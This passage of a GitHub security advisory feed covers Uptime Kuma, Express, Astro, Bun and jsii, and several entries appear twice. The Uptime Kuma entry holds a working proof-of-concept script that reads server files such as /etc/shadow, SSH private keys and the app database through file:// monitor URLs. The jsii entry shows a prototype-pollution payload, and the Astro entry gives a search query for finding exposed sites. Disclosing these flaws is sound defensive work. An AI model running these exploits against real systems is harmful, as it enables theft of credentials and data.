    // Connecting with credentials
    await new Promise((resolve, reject) =&gt; {
      socket.emit("login", {
        username: CONFIG.credentials.username,
        password: CONFIG.credentials.password,
        token: ""
      }, (res) =&gt; {
        if (res.ok) {
          console.log("Connection successful");
          resolve();
        } else {
          console.log(res);
          reject(new Error("Connection failed"));
        }
      });
    });

    // Sending requests for each file using Promise.all to ensure synchronization
    const realBrowserRequests = SENSITIVE_FILES.map(filePath =&gt; sendRequest(socket, filePath, CONFIG.requestType.REAL_BROWSER));

    // Wait for all requests to be sent
    await Promise.all([...realBrowserRequests]);

    // Close the socket after all requests have been sent
    socket.close();
    console.log("Connection closed after all requests.");

  } catch (error) {
    console.error("Error:", error.message);
    socket.close();
  }
})();
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability is a <strong>Local File Inclusion (LFI)</strong> issue, which allows an attacker to access and potentially exfiltrate sensitive files from the server. The impact is significant, as attackers can access critical system files or application configuration files, such as:</p>
<ul>
<li><code>/etc/passwd</code>: Contains user account information.</li>
<li><code>/etc/shadow</code>: Contains password hashes.</li>
<li><code>/app/data/kuma.db</code>: Contains the database for the Uptime Kuma monitoring tool.</li>
<li><code>/app/data/config.json</code>: Contains the database credentials for Uptime Kuma.</li>
</ul>
<p>Any <strong>authenticated user</strong> who can submit a URL in "real-browser" mode is at risk of exposing sensitive data through screenshots of these files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875">https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/releases/tag/1.23.16">https://github.com/louislam/uptime-kuma/releases/tag/1.23.16</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56331">https://nvd.nist.gov/vuln/detail/CVE-2024-56331</a></li>
<li><a href="https://github.com/advisories/GHSA-2qgm-m29m-cj2h">https://github.com/advisories/GHSA-2qgm-m29m-cj2h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2qgm-m29m-cj2h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-20T15:10:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uptime-kuma] uptime-kuma vulnerable to Local File Inclusion (LFI) via Improper URL Handling in `Real-Browser` monitor]]></title>
        <id>https://github.com/advisories/GHSA-2qgm-m29m-cj2h</id>
        <link href="https://github.com/advisories/GHSA-2qgm-m29m-cj2h"/>
        <updated>2024-12-20T21:36:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An <strong>Improper URL Handling Vulnerability</strong> allows an attacker to access sensitive local files on the server by exploiting the <code>file:///</code> protocol. This vulnerability is triggered via the <strong>"real-browser"</strong> request type, which takes a screenshot of the URL provided by the attacker. By supplying local file paths, such as <code>file:///etc/passwd</code>, an attacker can read sensitive data from the server.</p>
<h3 id="details">Details</h3>
<p>The vulnerability arises because the system does not properly validate or sanitize the user input for the URL field. Specifically:</p>
<ol>
<li><p>The URL input (<code>&lt;input data-v-5f5c86d7="" id="url" type="url" class="form-control" pattern="https?://.+" required=""&gt;</code>) allows users to input arbitrary file paths, including those using the <code>file:///</code> protocol, without server-side validation.</p>
</li>
<li><p>The server then uses the user-provided URL to make a request, passing it to a browser instance that performs the "real-browser" request, which takes a screenshot of the content at the given URL. If a local file path is entered (e.g., <code>file:///etc/passwd</code>), the browser fetches and captures the file’s content.</p>
</li>
</ol>
<pre><code class="language-javascript">const browser = await getBrowser();
const context = await browser.newContext();
const page = await context.newPage();

const res = await page.goto(monitor.url, {
    waitUntil: "networkidle",
    timeout: monitor.interval * 1000 * 0.8,
});

let filename = jwt.sign(monitor.id, server.jwtSecret) + ".png";

await page.screenshot({
    path: path.join(Database.screenshotDir, filename),
});

await context.close();
</code></pre>
<p>Since the user input is not validated, an attacker can manipulate the URL to request local files (e.g., <code>file:///etc/passwd</code>), and the system will capture a screenshot of the file's content, potentially exposing sensitive data.</p>
<h3 id="poc">PoC</h3>
<ol>
<li><strong>Instructions</strong>:<ul>
<li>Enter a local file path as the URL, such as: <code>view-source:file:///etc/passwd</code>.</li>
<li>The server will process the URL and, in "real-browser" mode, capture a screenshot of the file content.</li>
</ul>
</li>
</ol>
<p>Example PoC:</p>
<ol>
<li>Log in to the application with valid credentials:</li>
</ol>
<pre><code class="language-javascript">const { io } = require("socket.io-client");

// Server configuration and credentials
const CONFIG = {
  serverUrl: "ws://localhost:3001",
  credentials: {
    username: "admin",
    password: "password1"
  },
  requestType: {
    REAL_BROWSER: "real-browser",
    HTTP: "http"
  },
  urlHeader: {
    VIEW_SOURCE: "view-source:file:///",
    FILE: "file:///"
  }
};

// List of sensitive files on a Linux system
const SENSITIVE_FILES = [
  "/etc/passwd",
  "/etc/shadow",
  "/etc/hosts",
  "/etc/hostname",
  "/etc/network/interfaces", // May vary depending on the distribution
  "/etc/ssh/ssh_config",
  "/etc/ssh/sshd_config",
  "~/.ssh/authorized_keys",
  "~/.ssh/id_rsa",
  "/etc/ssl/private/*.key",
  "/etc/ssl/certs/*.crt",
  "/app/data/kuma.db", // Uptime Kuma database file
  "/app/data/config.json" // Uptime Kuma configuration file
];

// Function to send a request and wait for the response
function sendRequest(socket, filePath, type) {
  return new Promise((resolve, reject) =&gt; {
    fileUrl = CONFIG.urlHeader.VIEW_SOURCE + filePath;
    if (type == CONFIG.requestType.HTTP) {
      fileUrl = CONFIG.urlHeader.FILE + filePath;
    }
    socket.emit("add", {
      type: type,
      name: type + " " + filePath,
      url: fileUrl,
      method: "GET",
      maxretries: 0,
      timeout: 500,
      notificationIDList: {},
      ignoreTls: true,
      upsideDown: false,
      accepted_statuscodes: ["200-299"]
    }, (res) =&gt; {
      console.log(`Response for file ${filePath}:`, res);
      resolve();
    });
  });
}

// Main function for connecting and sending the 'add' request
(async () =&gt; {
  const socket = io(CONFIG.serverUrl);

  // Handle connection errors
  socket.on("connect_error", (err) =&gt; {
    console.error("Connection failed:", err.message);
  });

  try {
    // Connecting with credentials
    await new Promise((resolve, reject) =&gt; {
      socket.emit("login", {
        username: CONFIG.credentials.username,
        password: CONFIG.credentials.password,
        token: ""
      }, (res) =&gt; {
        if (res.ok) {
          console.log("Connection successful");
          resolve();
        } else {
          console.log(res);
          reject(new Error("Connection failed"));
        }
      });
    });

    // Sending requests for each file using Promise.all to ensure synchronization
    const realBrowserRequests = SENSITIVE_FILES.map(filePath =&gt; sendRequest(socket, filePath, CONFIG.requestType.REAL_BROWSER));

    // Wait for all requests to be sent
    await Promise.all([...realBrowserRequests]);

    // Close the socket after all requests have been sent
    socket.close();
    console.log("Connection closed after all requests.");

  } catch (error) {
    console.error("Error:", error.message);
    socket.close();
  }
})();
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability is a <strong>Local File Inclusion (LFI)</strong> issue, which allows an attacker to access and potentially exfiltrate sensitive files from the server. The impact is significant, as attackers can access critical system files or application configuration files, such as:</p>
<ul>
<li><code>/etc/passwd</code>: Contains user account information.</li>
<li><code>/etc/shadow</code>: Contains password hashes.</li>
<li><code>/app/data/kuma.db</code>: Contains the database for the Uptime Kuma monitoring tool.</li>
<li><code>/app/data/config.json</code>: Contains the database credentials for Uptime Kuma.</li>
</ul>
<p>Any <strong>authenticated user</strong> who can submit a URL in "real-browser" mode is at risk of exposing sensitive data through screenshots of these files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875">https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/releases/tag/1.23.16">https://github.com/louislam/uptime-kuma/releases/tag/1.23.16</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56331">https://nvd.nist.gov/vuln/detail/CVE-2024-56331</a></li>
<li><a href="https://github.com/advisories/GHSA-2qgm-m29m-cj2h">https://github.com/advisories/GHSA-2qgm-m29m-cj2h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2qgm-m29m-cj2h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-20T15:10:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[express] Express ressource injection]]></title>
        <id>https://github.com/advisories/GHSA-cm5g-3pgc-8rg4</id>
        <link href="https://github.com/advisories/GHSA-cm5g-3pgc-8rg4"/>
        <updated>2024-12-19T17:52:11.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability has been identified in the Express response.links&nbsp;function, allowing for arbitrary resource injection in the Link&nbsp;header when unsanitized data is used.</p>
<p>The issue arises from improper sanitization in <code>Link</code> header values, which can allow a combination of characters like <code>,</code>, <code>;</code>, and <code>&lt;&gt;</code> to preload malicious resources.</p>
<p>This vulnerability is especially relevant for dynamic parameters.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-10491">https://nvd.nist.gov/vuln/detail/CVE-2024-10491</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2024-10491">https://www.herodevs.com/vulnerability-directory/cve-2024-10491</a></li>
<li><a href="https://github.com/expressjs/express/issues/6222">https://github.com/expressjs/express/issues/6222</a></li>
<li><a href="https://github.com/advisories/GHSA-cm5g-3pgc-8rg4">https://github.com/advisories/GHSA-cm5g-3pgc-8rg4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cm5g-3pgc-8rg4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-29T18:30:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[astro] Astro's server source code is exposed to the public if sourcemaps are enabled]]></title>
        <id>https://github.com/advisories/GHSA-49w6-73cw-chjr</id>
        <link href="https://github.com/advisories/GHSA-49w6-73cw-chjr"/>
        <updated>2024-12-19T21:38:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A bug in the build process allows any unauthenticated user to read parts of the server source code.</p>
<h3 id="details">Details</h3>
<p>During build, along with client assets such as css and font files, the sourcemap files <strong>for the server code</strong> are moved to a publicly-accessible folder.
<a href="https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139">https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></p>
<p>Any outside party can read them with an unauthorized HTTP GET request to the same server hosting the rest of the website.</p>
<p>While some server files are hashed, making their access obscure, the files corresponding to the file system router (those in <code>src/pages</code>) are predictably named. For example. the sourcemap file for <code>src/pages/index.astro</code> gets named <code>dist/client/pages/index.astro.mjs.map</code>.</p>
<h3 id="poc">PoC</h3>
<p>Here is one example of an affected open-source website:
<a href="https://creatorsgarten.org/pages/index.astro.mjs.map">https://creatorsgarten.org/pages/index.astro.mjs.map</a></p>
<img src="https://github.com/user-attachments/assets/773c5532-87af-42b8-838e-8f5472bf9f68" height="263" width="500">

<p>The file can be saved and opened using <a href="https://evanw.github.io/source-map-visualization/">https://evanw.github.io/source-map-visualization/</a> to reconstruct the source code.</p>
<img src="https://github.com/user-attachments/assets/7d35d0ca-3a29-4666-be21-cfefe311ac9d" height="271" width="500">

<p>The above accurately mirrors the source code as seen in the repository: <a href="https://github.com/creatorsgarten/creatorsgarten.org/blob/main/src/pages/index.astro">https://github.com/creatorsgarten/creatorsgarten.org/blob/main/src/pages/index.astro</a></p>
<img src="https://github.com/user-attachments/assets/39e77197-8382-4556-a024-c526dacccc1c" height="298" width="500">


<p>The above was found as the 4th result (and the first one on Astro 5.0+) when making the following search query on GitHub.com (<a href="https://github.com/search?q=path%3Aastro.config.mjs+%40sentry%2Fastro&amp;type=code">search results link</a>):</p>
<pre><code>path:astro.config.mjs @sentry/astro
</code></pre>
<p>This vulnerability is the root cause of <a href="https://github.com/withastro/astro/issues/12703">https://github.com/withastro/astro/issues/12703</a>, which links to a simple stackblitz project demonstrating the vulnerability. Upon build, notice the contents of the <code>dist/client</code> (referred to as <code>config.build.client</code> in astro code) folder. All astro servers make the folder in question accessible to the public internet without any authentication. It contains <code>.map</code> files corresponding to the code that runs on the server.</p>
<h3 id="impact">Impact</h3>
<p>All <strong>server-output</strong> (SSR) projects on Astro 5 versions <strong>v5.0.3</strong> through <strong>v5.0.6</strong> (inclusive), that have <strong>sourcemaps enabled</strong>, either directly or through an add-on such as <a href="https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50">sentry</a>, are affected. The fix for <strong>server-output</strong> projects was released in <strong><a href="mailto:astro@5.0.7">astro@5.0.7</a></strong>.</p>
<p>Additionally, all <strong>static-output</strong> (SSG) projects built using Astro 4 versions <strong>4.16.17 or older</strong>, or Astro 5 versions <strong>5.0.7 or older</strong>, that have <strong>sourcemaps enabled</strong> are also affected. The fix for <strong>static-output</strong> projects was released in <strong><a href="mailto:astro@5.0.8">astro@5.0.8</a></strong>, and backported to Astro v4 in <strong><a href="mailto:astro@4.16.18">astro@4.16.18</a></strong>.</p>
<p>The immediate impact is limited to source code. Any secrets or environment variables are not exposed unless they are present verbatim in the source code.</p>
<p>There is no immediate loss of integrity within the the vulnerable server. However, it is possible to subsequently discover another vulnerability via the revealed source code .</p>
<p>There is no immediate impact to availability of the vulnerable server. However, the presence of an unsafe regular expression, for example, can quickly be exploited to subsequently compromise the availability.</p>
<ul>
<li>Network attack vector.</li>
<li>Low attack complexity.</li>
<li>No privileges required.</li>
<li>No interaction required from an authorized user.</li>
<li>Scope is limited to first party. Although the source code of closed-source third-party software may also be exposed.</li>
</ul>
<h3 id="remediation">Remediation</h3>
<p>The fix for <strong>server-output</strong> projects was released in <strong><a href="mailto:astro@5.0.7">astro@5.0.7</a></strong>, and the fix for <strong>static-output</strong> projects was released in <strong><a href="mailto:astro@5.0.8">astro@5.0.8</a></strong> and backported to Astro v4 in <strong><a href="mailto:astro@4.16.18">astro@4.16.18</a></strong>. Users are advised to update immediately if they are using sourcemaps or an integration that enables sourcemaps.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr">https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr</a></li>
<li><a href="https://github.com/withastro/astro/issues/12703">https://github.com/withastro/astro/issues/12703</a></li>
<li><a href="https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515">https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515</a></li>
<li><a href="https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5">https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5</a></li>
<li><a href="https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139">https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56159">https://nvd.nist.gov/vuln/detail/CVE-2024-56159</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50">https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50</a></li>
<li><a href="https://github.com/advisories/GHSA-49w6-73cw-chjr">https://github.com/advisories/GHSA-49w6-73cw-chjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-49w6-73cw-chjr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-19T15:12:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[astro] Astro's server source code is exposed to the public if sourcemaps are enabled]]></title>
        <id>https://github.com/advisories/GHSA-49w6-73cw-chjr</id>
        <link href="https://github.com/advisories/GHSA-49w6-73cw-chjr"/>
        <updated>2024-12-19T21:38:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A bug in the build process allows any unauthenticated user to read parts of the server source code.</p>
<h3 id="details">Details</h3>
<p>During build, along with client assets such as css and font files, the sourcemap files <strong>for the server code</strong> are moved to a publicly-accessible folder.
<a href="https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139">https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></p>
<p>Any outside party can read them with an unauthorized HTTP GET request to the same server hosting the rest of the website.</p>
<p>While some server files are hashed, making their access obscure, the files corresponding to the file system router (those in <code>src/pages</code>) are predictably named. For example. the sourcemap file for <code>src/pages/index.astro</code> gets named <code>dist/client/pages/index.astro.mjs.map</code>.</p>
<h3 id="poc">PoC</h3>
<p>Here is one example of an affected open-source website:
<a href="https://creatorsgarten.org/pages/index.astro.mjs.map">https://creatorsgarten.org/pages/index.astro.mjs.map</a></p>
<img src="https://github.com/user-attachments/assets/773c5532-87af-42b8-838e-8f5472bf9f68" height="263" width="500">

<p>The file can be saved and opened using <a href="https://evanw.github.io/source-map-visualization/">https://evanw.github.io/source-map-visualization/</a> to reconstruct the source code.</p>
<img src="https://github.com/user-attachments/assets/7d35d0ca-3a29-4666-be21-cfefe311ac9d" height="271" width="500">

<p>The above accurately mirrors the source code as seen in the repository: <a href="https://github.com/creatorsgarten/creatorsgarten.org/blob/main/src/pages/index.astro">https://github.com/creatorsgarten/creatorsgarten.org/blob/main/src/pages/index.astro</a></p>
<img src="https://github.com/user-attachments/assets/39e77197-8382-4556-a024-c526dacccc1c" height="298" width="500">


<p>The above was found as the 4th result (and the first one on Astro 5.0+) when making the following search query on GitHub.com (<a href="https://github.com/search?q=path%3Aastro.config.mjs+%40sentry%2Fastro&amp;type=code">search results link</a>):</p>
<pre><code>path:astro.config.mjs @sentry/astro
</code></pre>
<p>This vulnerability is the root cause of <a href="https://github.com/withastro/astro/issues/12703">https://github.com/withastro/astro/issues/12703</a>, which links to a simple stackblitz project demonstrating the vulnerability. Upon build, notice the contents of the <code>dist/client</code> (referred to as <code>config.build.client</code> in astro code) folder. All astro servers make the folder in question accessible to the public internet without any authentication. It contains <code>.map</code> files corresponding to the code that runs on the server.</p>
<h3 id="impact">Impact</h3>
<p>All <strong>server-output</strong> (SSR) projects on Astro 5 versions <strong>v5.0.3</strong> through <strong>v5.0.6</strong> (inclusive), that have <strong>sourcemaps enabled</strong>, either directly or through an add-on such as <a href="https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50">sentry</a>, are affected. The fix for <strong>server-output</strong> projects was released in <strong><a href="mailto:astro@5.0.7">astro@5.0.7</a></strong>.</p>
<p>Additionally, all <strong>static-output</strong> (SSG) projects built using Astro 4 versions <strong>4.16.17 or older</strong>, or Astro 5 versions <strong>5.0.7 or older</strong>, that have <strong>sourcemaps enabled</strong> are also affected. The fix for <strong>static-output</strong> projects was released in <strong><a href="mailto:astro@5.0.8">astro@5.0.8</a></strong>, and backported to Astro v4 in <strong><a href="mailto:astro@4.16.18">astro@4.16.18</a></strong>.</p>
<p>The immediate impact is limited to source code. Any secrets or environment variables are not exposed unless they are present verbatim in the source code.</p>
<p>There is no immediate loss of integrity within the the vulnerable server. However, it is possible to subsequently discover another vulnerability via the revealed source code .</p>
<p>There is no immediate impact to availability of the vulnerable server. However, the presence of an unsafe regular expression, for example, can quickly be exploited to subsequently compromise the availability.</p>
<ul>
<li>Network attack vector.</li>
<li>Low attack complexity.</li>
<li>No privileges required.</li>
<li>No interaction required from an authorized user.</li>
<li>Scope is limited to first party. Although the source code of closed-source third-party software may also be exposed.</li>
</ul>
<h3 id="remediation">Remediation</h3>
<p>The fix for <strong>server-output</strong> projects was released in <strong><a href="mailto:astro@5.0.7">astro@5.0.7</a></strong>, and the fix for <strong>static-output</strong> projects was released in <strong><a href="mailto:astro@5.0.8">astro@5.0.8</a></strong> and backported to Astro v4 in <strong><a href="mailto:astro@4.16.18">astro@4.16.18</a></strong>. Users are advised to update immediately if they are using sourcemaps or an integration that enables sourcemaps.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr">https://github.com/withastro/astro/security/advisories/GHSA-49w6-73cw-chjr</a></li>
<li><a href="https://github.com/withastro/astro/issues/12703">https://github.com/withastro/astro/issues/12703</a></li>
<li><a href="https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515">https://github.com/withastro/astro/commit/039d022b1bbaacf9ea83071d27affc5318e0e515</a></li>
<li><a href="https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5">https://github.com/withastro/astro/commit/c879f501ff01b1a3c577de776a1f7100d78f8dd5</a></li>
<li><a href="https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139">https://github.com/withastro/astro/blob/176fe9f113fd912f9b61e848b00bbcfecd6d5c2c/packages/astro/src/core/build/static-build.ts#L139</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56159">https://nvd.nist.gov/vuln/detail/CVE-2024-56159</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50">https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50</a></li>
<li><a href="https://github.com/advisories/GHSA-49w6-73cw-chjr">https://github.com/advisories/GHSA-49w6-73cw-chjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-49w6-73cw-chjr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-19T15:12:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bun] Bun has an Application-level Prototype Pollution vulnerability in the runtime native API for Glo]]></title>
        <id>https://github.com/advisories/GHSA-v9mx-4pqq-h232</id>
        <link href="https://github.com/advisories/GHSA-v9mx-4pqq-h232"/>
        <updated>2024-12-18T16:56:07.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package bun before 1.1.30 are vulnerable to Prototype Pollution due to improper input sanitization. An attacker can exploit this vulnerability through Bun's APIs that accept objects.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21548">https://nvd.nist.gov/vuln/detail/CVE-2024-21548</a></li>
<li><a href="https://github.com/oven-sh/bun/pull/14119">https://github.com/oven-sh/bun/pull/14119</a></li>
<li><a href="https://github.com/oven-sh/bun/commit/a234e067a5dc7837602df3fb5489e826920cc65a">https://github.com/oven-sh/bun/commit/a234e067a5dc7837602df3fb5489e826920cc65a</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-BUN-8499549">https://security.snyk.io/vuln/SNYK-JS-BUN-8499549</a></li>
<li><a href="https://github.com/advisories/GHSA-v9mx-4pqq-h232">https://github.com/advisories/GHSA-v9mx-4pqq-h232</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v9mx-4pqq-h232</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-18T06:30:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsii] Prototype pollution in jsii.configureCategories]]></title>
        <id>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</id>
        <link href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2"/>
        <updated>2025-01-07T15:12:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jsii</code> is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.
When loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.</p>
<h2 id="impact">Impact</h2>
<p>You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the <code>jsii.configureCategories()</code> function. In that case, a user can craft input in such a way that, following the invocation, a field named "category" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named "category", even if it shouldn't. </p>
<p><strong>This will not affect jsii itself, but it might affect the application you have loaded jsii into.</strong></p>
<blockquote>
<p>The function <code>jsii.configureCategories()</code> is used to configure the severity (error, warning, etc.) of various jsii diagnostics.</p>
</blockquote>
<p><strong>Impacted versions: &lt;=5.7.2, &lt;=5.6.3, &lt;=5.5.14, &lt;=5.4.45</strong> </p>
<p><strong>Example:</strong></p>
<pre><code class="language-js">const jsii = require('jsii');

// prints 'undefined'
console.log(JSON.stringify({}.category))

// calling 'configureCategories' with user input
jsii.configureCategories(JSON.parse('{"__proto__": "user-input"}'))

// from this point onwards, every single object literal in the program
// will contain the 'category' key, with user controlled value
console.log(JSON.stringify({}.category)) // prints 'user-input'


// this can affect the execution of the main program in case it also makes 
// use of an object key called 'category'. for example, if the main programs 
// happens to have code like this:

const x = {} // some object in the main program (not necessarily empty)

if (x.category) {
  // this block will always be executed, effectively 
  // changing the behavior of the main program.
  console.log('Do something')
} else {
  console.log('Do something else')
}
</code></pre>
<p>For more information about javascript prototype pollution, see [1].</p>
<h2 id="patches">Patches</h2>
<p>A patch is included in versions <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">5.7.3</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">5.6.4</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">5.5.15</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">5.4.46</a></p>
<h2 id="workarounds">Workarounds</h2>
<p>Sanitize user input to configureCategories() by stripping the <strong>proto</strong> property if detected.</p>
<h2 id="references">References</h2>
<p>If you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our issue reporting page [2] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://learn.snyk.io/lesson/prototype-pollution/">https://learn.snyk.io/lesson/prototype-pollution/</a></p>
<p>[2] <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/issue-reporting</a></p>
<h2 id="credits">Credits</h2>
<p>We would like to thank <em>Tariq Hawis</em> for collaborating on this issue through the coordinated vulnerability disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li>
<li><a href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/advisories/GHSA-m56h-5xx3-2jc2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-12-18T15:50:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsii] Prototype pollution in jsii.configureCategories]]></title>
        <id>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</id>
        <link href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2"/>
        <updated>2025-01-07T15:12:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jsii</code> is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.
When loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.</p>
<h2 id="impact">Impact</h2>
<p>You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the <code>jsii.configureCategories()</code> function. In that case, a user can craft input in such a way that, following the invocation, a field named "category" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named "category", even if it shouldn't. </p>
<p><strong>This will not affect jsii itself, but it might affect the application you have loaded jsii into.</strong></p>
<blockquote>
